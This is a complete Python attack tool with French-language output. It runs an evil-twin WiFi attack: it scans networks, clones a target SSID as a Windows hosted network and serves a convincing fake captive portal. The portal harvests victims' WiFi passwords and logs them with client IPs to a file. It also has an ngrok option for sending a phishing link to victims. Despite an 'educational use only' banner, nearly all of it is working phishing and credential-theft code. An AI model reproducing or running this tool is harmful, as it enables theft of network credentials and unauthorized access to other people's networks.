#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    👿 EVIL TWIN WIFI ATTACK v1.0 👿                               ║
║                    Capture les mots de passe WiFi                                ║
║                    ⚠️ USAGE ÉDUCATIF UNIQUEMENT ⚠️                               ║
╚══════════════════════════════════════════════════════════════════════════════════╝

PRINCIPE:
1. Crée un faux point d'accès avec le même nom que la cible
2. La victime se connecte au faux réseau
3. Une page de connexion demande le mot de passe WiFi
4. On capture le mot de passe!
"""

import subprocess
import os
import sys
import socket
import threading
import time
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import urllib.parse

# ==================== COULEURS ====================
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== CONFIGURATION ====================
CAPTURED_PASSWORDS_FILE = r"C:\Users\davis\OneDrive\Bureau\HACKING\04_PHISHING_ET_TESTS\HackingTools\wifi_results\captured_wifi_passwords.json"
os.makedirs(os.path.dirname(CAPTURED_PASSWORDS_FILE), exist_ok=True)

# Variable globale pour stocker le SSID cible
TARGET_SSID = "LION DE JUDA-5G"
captured_passwords = []

# ==================== PAGE DE PHISHING WIFI ====================
def get_captive_portal_page(ssid):
    """Génère la page de portail captif"""
    return f'''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion WiFi - {ssid}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }}
        
        body {{
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
        }}
        
        .wifi-icon {{
            text-align: center;
            margin-bottom: 20px;
        }}
        
        .wifi-icon svg {{
            width: 80px;
            height: 80px;
            fill: #0f3460;
        }}
        
        h1 {{
            text-align: center;
            color: #1a1a2e;
            font-size: 24px;
            margin-bottom: 10px;
        }}
        
        .ssid-name {{
            text-align: center;
            color: #0f3460;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 30px;
            padding: 10px;
            background: #e8f4f8;
            border-radius: 10px;
        }}
        
        .message {{
            text-align: center;
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
            line-height: 1.5;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        label {{
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }}
        
        input[type="password"] {{
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }}
        
        input[type="password"]:focus {{
            outline: none;
            border-color: #0f3460;
        }}
        
        .show-password {{
            display: flex;
            align-items: center;
            margin-top: 10px;
            cursor: pointer;
        }}
        
        .show-password input {{
            margin-right: 8px;
        }}
        
        button {{
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0f3460, #1a1a2e);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }}
        
        button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }}
        
        .footer {{
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }}
        
        .error {{
            background: #ffe6e6;
            color: #cc0000;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
            display: none;
        }}
        
        .loading {{
            display: none;
            text-align: center;
            padding: 20px;
        }}
        
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0f3460;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 21l-1.5-1.5c-2.2-2.2-3.5-5.3-3.5-8.5s1.3-6.3 3.5-8.5L12 1l1.5 1.5c2.2 2.2 3.5 5.3 3.5 8.5s-1.3 6.3-3.5 8.5L12 21z"/>
                <path d="M12 3C7.58 3 4 6.58 4 11c0 2.62 1.07 5 2.79 6.71L12 23l5.21-5.29C18.93 16 20 13.62 20 11c0-4.42-3.58-8-8-8zm0 16.5l-3.79-3.79C6.84 14.34 6 12.74 6 11c0-3.31 2.69-6 6-6s6 2.69 6 6c0 1.74-.84 3.34-2.21 4.71L12 19.5z"/>
            </svg>
        </div>
        
        <h1>🔐 Connexion WiFi Requise</h1>
        <div class="ssid-name">📡 {ssid}</div>
        
        <p class="message">
            Pour des raisons de sécurité, veuillez entrer le mot de passe 
            de votre réseau WiFi pour continuer la connexion.
        </p>
        
        <div class="error" id="error">
            Mot de passe incorrect. Veuillez réessayer.
        </div>
        
        <form id="wifiForm" action="/capture" method="POST">
            <input type="hidden" name="ssid" value="{ssid}">
            
            <div class="form-group">
                <label for="password">Mot de passe WiFi:</label>
                <input type="password" id="password" name="password" 
                       placeholder="Entrez votre mot de passe" required
                       minlength="8" autocomplete="off">
                <label class="show-password">
                    <input type="checkbox" onclick="togglePassword()">
                    Afficher le mot de passe
                </label>
            </div>
            
            <button type="submit">Se connecter</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Vérification en cours...</p>
        </div>
        
        <div class="footer">
            🔒 Connexion sécurisée<br>
            Configuration réseau automatique
        </div>
    </div>
    
    <script>
        function togglePassword() {{
            var x = document.getElementById("password");
            x.type = x.type === "password" ? "text" : "password";
        }}
        
        document.getElementById("wifiForm").onsubmit = function() {{
            document.getElementById("wifiForm").style.display = "none";
            document.getElementById("loading").style.display = "block";
        }};
    </script>
</body>
</html>'''

def get_success_page(ssid):
    """Page affichée après capture du mot de passe"""
    return f'''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion réussie</title>
    <meta http-equiv="refresh" content="5;url=http://www.google.com">
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white;
            text-align: center;
        }}
        .container {{
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
        }}
        .checkmark {{
            font-size: 80px;
            margin-bottom: 20px;
        }}
        h1 {{ margin-bottom: 10px; }}
        p {{ opacity: 0.9; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✅</div>
        <h1>Connexion réussie!</h1>
        <p>Vous êtes maintenant connecté à {ssid}</p>
        <p>Redirection en cours...</p>
    </div>
</body>
</html>'''

# ==================== SERVEUR WEB ====================
class CaptivePortalHandler(BaseHTTPRequestHandler):
    """Gestionnaire du portail captif"""
    
    def log_message(self, format, *args):
        """Désactiver les logs par défaut"""
        pass
    
    def do_GET(self):
        """Gère les requêtes GET"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(get_captive_portal_page(TARGET_SSID).encode('utf-8'))
    
    def do_POST(self):
        """Gère les requêtes POST (capture du mot de passe)"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parser les données
        params = urllib.parse.parse_qs(post_data)
        password = params.get('password', [''])[0]
        ssid = params.get('ssid', [TARGET_SSID])[0]
        
        # Sauvegarder le mot de passe capturé
        capture_data = {
            'ssid': ssid,
            'password': password,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'client_ip': self.client_address[0]
        }
        
        captured_passwords.append(capture_data)
        
        # Sauvegarder dans le fichier
        with open(CAPTURED_PASSWORDS_FILE, 'w', encoding='utf-8') as f:
            json.dump(captured_passwords, f, indent=2, ensure_ascii=False)
        
        # Afficher dans le terminal
        print(f"\n{C.GREEN}{'='*60}{C.END}")
        print(f"{C.GREEN}[✓] MOT DE PASSE WIFI CAPTURÉ!{C.END}")
        print(f"{C.GREEN}{'='*60}{C.END}")
        print(f"{C.CYAN}[*] SSID: {C.WHITE}{ssid}{C.END}")
        print(f"{C.CYAN}[*] Mot de passe: {C.WHITE}{password}{C.END}")
        print(f"{C.CYAN}[*] IP Client: {C.WHITE}{self.client_address[0]}{C.END}")
        print(f"{C.CYAN}[*] Heure: {C.WHITE}{capture_data['timestamp']}{C.END}")
        print(f"{C.GREEN}{'='*60}{C.END}")
        print(f"{C.YELLOW}[*] Sauvegardé dans: {CAPTURED_PASSWORDS_FILE}{C.END}\n")
        
        # Répondre avec la page de succès
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(get_success_page(ssid).encode('utf-8'))

# ==================== FONCTIONS HOTSPOT ====================

def check_hotspot_capability():
    """Vérifie si le PC peut créer un hotspot"""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "drivers"],
            capture_output=True, text=True, encoding='cp850'
        )
        
        if "Réseau hébergé pris en charge" in result.stdout or "Hosted network supported" in result.stdout:
            if "Oui" in result.stdout or "Yes" in result.stdout:
                return True
        return False
    except:
        return False

def create_hotspot(ssid, password=""):
    """Crée un point d'accès WiFi (Evil Twin)"""
    
    print(f"{C.CYAN}[*] Création du point d'accès '{ssid}'...{C.END}")
    
    try:
        # Arrêter tout hotspot existant
        subprocess.run(["netsh", "wlan", "stop", "hostednetwork"], 
                      capture_output=True, timeout=5)
        
        # Configurer le nouveau hotspot
        if password:
            subprocess.run([
                "netsh", "wlan", "set", "hostednetwork",
                f"mode=allow", f"ssid={ssid}", f"key={password}"
            ], capture_output=True, timeout=5)
        else:
            subprocess.run([
                "netsh", "wlan", "set", "hostednetwork",
                f"mode=allow", f"ssid={ssid}"
            ], capture_output=True, timeout=5)
        
        # Démarrer le hotspot
        result = subprocess.run(
            ["netsh", "wlan", "start", "hostednetwork"],
            capture_output=True, text=True, encoding='cp850', timeout=10
        )
        
        if "démarré" in result.stdout.lower() or "started" in result.stdout.lower():
            print(f"{C.GREEN}[✓] Hotspot '{ssid}' créé avec succès!{C.END}")
            return True
        else:
            print(f"{C.RED}[!] Échec de création du hotspot{C.END}")
            print(f"{C.RED}    {result.stdout}{C.END}")
            return False
            
    except Exception as e:
        print(f"{C.RED}[!] Erreur: {e}{C.END}")
        return False

def stop_hotspot():
    """Arrête le point d'accès"""
    try:
        subprocess.run(["netsh", "wlan", "stop", "hostednetwork"], 
                      capture_output=True, timeout=5)
        print(f"{C.YELLOW}[*] Hotspot arrêté{C.END}")
    except:
        pass

def get_hotspot_ip():
    """Obtient l'adresse IP du hotspot"""
    try:
        # L'IP du hotspot Windows est généralement 192.168.137.1
        return "192.168.137.1"
    except:
        return "192.168.137.1"

# ==================== MÉTHODE ALTERNATIVE: SERVEUR LOCAL ====================

def run_phishing_server(port=80):
    """Lance le serveur de phishing"""
    global TARGET_SSID
    
    try:
        server = HTTPServer(('0.0.0.0', port), CaptivePortalHandler)
        print(f"{C.GREEN}[✓] Serveur de capture démarré sur le port {port}{C.END}")
        print(f"{C.CYAN}[*] En attente de connexions...{C.END}")
        print(f"{C.YELLOW}[*] Envoyez ce lien à la victime ou configurez le DNS{C.END}")
        server.serve_forever()
    except PermissionError:
        print(f"{C.RED}[!] Erreur: Le port {port} nécessite des droits admin{C.END}")
        print(f"{C.YELLOW}[*] Essai sur le port 8080...{C.END}")
        try:
            server = HTTPServer(('0.0.0.0', 8080), CaptivePortalHandler)
            print(f"{C.GREEN}[✓] Serveur démarré sur le port 8080{C.END}")
            print(f"{C.CYAN}[*] URL: http://localhost:8080{C.END}")
            server.serve_forever()
        except Exception as e:
            print(f"{C.RED}[!] Erreur: {e}{C.END}")
    except Exception as e:
        print(f"{C.RED}[!] Erreur serveur: {e}{C.END}")

# ==================== MENU PRINCIPAL ====================

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
║  ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗                 ║
║  ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║                 ║
║  █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║                 ║
║  ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║                 ║
║  ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║                 ║
║  ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝                 ║
║                                                                                  ║
║{C.WHITE}                    👿 WIFI PASSWORD CAPTURE v1.0 👿{C.RED}                             ║
║{C.YELLOW}                    Capture les mots de passe WiFi{C.RED}                              ║
╚══════════════════════════════════════════════════════════════════════════════════╝{C.END}
""")

def scan_networks():
    """Scanne et affiche les réseaux WiFi"""
    print(f"\n{C.CYAN}[*] Scan des réseaux WiFi...{C.END}\n")
    
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, encoding='cp850'
        )
        
        networks = []
        current = {}
        
        for line in result.stdout.split('\n'):
            line = line.strip()
            if line.startswith("SSID") and "BSSID" not in line:
                if current.get('ssid'):
                    networks.append(current)
                current = {'ssid': line.split(":", 1)[-1].strip()}
            elif "Signal" in line:
                current['signal'] = line.split(":", 1)[-1].strip()
            elif "Authentification" in line or "Authentication" in line:
                current['auth'] = line.split(":", 1)[-1].strip()
        
        if current.get('ssid'):
            networks.append(current)
        
        networks = [n for n in networks if n.get('ssid')]
        
        print(f"{C.CYAN}┌{'─'*60}┐{C.END}")
        print(f"{C.CYAN}│{C.YELLOW}{'RÉSEAUX WIFI DÉTECTÉS':^60}{C.CYAN}│{C.END}")
        print(f"{C.CYAN}├{'─'*60}┤{C.END}")
        
        for i, n in enumerate(networks, 1):
            ssid = n.get('ssid', 'N/A')[:30]
            signal = n.get('signal', 'N/A')[:10]
            print(f"{C.CYAN}│ {C.WHITE}{i:2}. {ssid:35} {signal:15}{C.CYAN}│{C.END}")
        
        print(f"{C.CYAN}└{'─'*60}┘{C.END}")
        
        return networks
        
    except Exception as e:
        print(f"{C.RED}[!] Erreur: {e}{C.END}")
        return []

def main_menu():
    global TARGET_SSID
    
    while True:
        banner()
        
        print(f"""
{C.CYAN}┌────────────────────────────────────────────────────────────────────┐
│  {C.YELLOW}📋 MENU PRINCIPAL{C.CYAN}                                                 │
├────────────────────────────────────────────────────────────────────┤
│  {C.WHITE}[1]{C.END} 📡 Scanner les réseaux WiFi                                  {C.CYAN}│
│  {C.WHITE}[2]{C.END} 🎯 Définir la cible (actuel: {TARGET_SSID[:20]:20}){C.CYAN}      │
│  {C.WHITE}[3]{C.END} 👿 Lancer l'attaque Evil Twin (Hotspot + Phishing)           {C.CYAN}│
│  {C.WHITE}[4]{C.END} 🌐 Lancer le serveur de phishing seul                        {C.CYAN}│
│  {C.WHITE}[5]{C.END} 📊 Voir les mots de passe capturés                           {C.CYAN}│
│  {C.WHITE}[6]{C.END} 🔗 Générer lien de phishing (avec ngrok)                     {C.CYAN}│
├────────────────────────────────────────────────────────────────────┤
│  {C.WHITE}[0]{C.END} 🚪 Quitter                                                   {C.CYAN}│
└────────────────────────────────────────────────────────────────────┘{C.END}
""")
        
        choice = input(f"{C.GREEN}👉 Choix: {C.END}").strip()
        
        if choice == '1':
            networks = scan_networks()
            input(f"\n{C.YELLOW}Appuyez sur Entrée...{C.END}")
        
        elif choice == '2':
            networks = scan_networks()
            idx = input(f"\n{C.GREEN}Numéro du réseau cible (ou tapez le nom): {C.END}").strip()
            
            try:
                TARGET_SSID = networks[int(idx) - 1]['ssid']
            except:
                TARGET_SSID = idx
            
            print(f"{C.GREEN}[✓] Cible définie: {TARGET_SSID}{C.END}")
            input(f"\n{C.YELLOW}Appuyez sur Entrée...{C.END}")
        
        elif choice == '3':
            print(f"\n{C.YELLOW}[*] Lancement de l'attaque Evil Twin sur '{TARGET_SSID}'...{C.END}")
            
            # Vérifier si le hotspot est supporté
            if check_hotspot_capability():
                print(f"{C.GREEN}[✓] Hotspot supporté par votre carte WiFi{C.END}")
                
                # Créer le hotspot
                if create_hotspot(TARGET_SSID):
                    print(f"{C.GREEN}[✓] Evil Twin créé!{C.END}")
                    print(f"{C.CYAN}[*] Les victimes vont voir 2 réseaux '{TARGET_SSID}'{C.END}")
                    print(f"{C.CYAN}[*] Quand ils se connectent, ils voient la page de phishing{C.END}")
                    
                    # Lancer le serveur
                    print(f"\n{C.YELLOW}[*] Démarrage du serveur de capture...{C.END}")
                    print(f"{C.RED}[!] Appuyez sur Ctrl+C pour arrêter{C.END}\n")
                    
                    try:
                        run_phishing_server(80)
                    except KeyboardInterrupt:
                        stop_hotspot()
                        print(f"\n{C.YELLOW}[*] Attaque arrêtée{C.END}")
            else:
                print(f"{C.RED}[!] Votre carte WiFi ne supporte pas le mode hotspot{C.END}")
                print(f"{C.YELLOW}[*] Alternative: Utilisez l'option 4 ou 6{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée...{C.END}")
        
        elif choice == '4':
            print(f"\n{C.CYAN}[*] Serveur de phishing WiFi pour '{TARGET_SSID}'{C.END}")
            print(f"{C.YELLOW}[*] Partagez l'URL avec la victime{C.END}")
            print(f"{C.RED}[!] Appuyez sur Ctrl+C pour arrêter{C.END}\n")
            
            try:
                run_phishing_server(8080)
            except KeyboardInterrupt:
                print(f"\n{C.YELLOW}[*] Serveur arrêté{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée...{C.END}")
        
        elif choice == '5':
            print(f"\n{C.CYAN}[*] Mots de passe WiFi capturés:{C.END}\n")
            
            if os.path.exists(CAPTURED_PASSWORDS_FILE):
                with open(CAPTURED_PASSWORDS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                
                if data:
                    for entry in data:
                        print(f"{C.GREEN}{'='*50}{C.END}")
                        print(f"{C.WHITE}SSID: {entry.get('ssid')}{C.END}")
                        print(f"{C.GREEN}Mot de passe: {entry.get('password')}{C.END}")
                        print(f"{C.CYAN}Date: {entry.get('timestamp')}{C.END}")
                        print(f"{C.CYAN}IP: {entry.get('client_ip')}{C.END}")
                else:
                    print(f"{C.YELLOW}Aucun mot de passe capturé encore{C.END}")
            else:
                print(f"{C.YELLOW}Aucun mot de passe capturé encore{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée...{C.END}")
        
        elif choice == '6':
            print(f"\n{C.CYAN}[*] Lancement du serveur avec tunnel ngrok...{C.END}")
            
            # Lancer ngrok en arrière-plan
            ngrok_path = r"C:\Users\davis\OneDrive\Bureau\HACKING\Tools\ngrok.exe"
            
            if os.path.exists(ngrok_path):
                print(f"{C.YELLOW}[*] Démarrage de ngrok...{C.END}")
                subprocess.Popen([ngrok_path, "http", "8080"], 
                               creationflags=subprocess.CREATE_NEW_CONSOLE)
                
                time.sleep(3)
                print(f"{C.GREEN}[✓] Ngrok démarré!{C.END}")
                print(f"{C.CYAN}[*] Vérifiez l'URL dans la fenêtre ngrok{C.END}")
                print(f"{C.YELLOW}[*] Envoyez cette URL à la victime{C.END}")
                
                # Lancer le serveur
                run_phishing_server(8080)
            else:
                print(f"{C.RED}[!] Ngrok non trouvé{C.END}")
                print(f"{C.YELLOW}[*] Téléchargez-le sur ngrok.com{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée...{C.END}")
        
        elif choice == '0':
            stop_hotspot()
            print(f"\n{C.CYAN}[*] Au revoir!{C.END}")
            break

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        stop_hotspot()
        print(f"\n{C.YELLOW}[*] Interruption...{C.END}")
